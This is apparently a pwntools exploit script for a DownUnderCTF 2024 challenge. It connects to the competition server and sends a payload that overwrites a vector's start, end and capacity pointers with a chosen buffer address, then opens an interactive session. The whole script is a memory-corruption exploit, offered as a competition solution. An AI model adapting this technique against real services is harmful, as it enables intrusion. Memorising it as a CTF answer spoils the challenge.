from pwn import *

p = remote("2024.ductf.dev", 30013)

BUF = 0x4051e0

payload = b""
payload += b"DUCTF"
payload += b"\x00" * 11
payload += p64(BUF)     # v.start
payload += p64(BUF + 5) # v.end
payload += p64(BUF + 5) # v.capacity

p.sendline(payload)

p.interactive()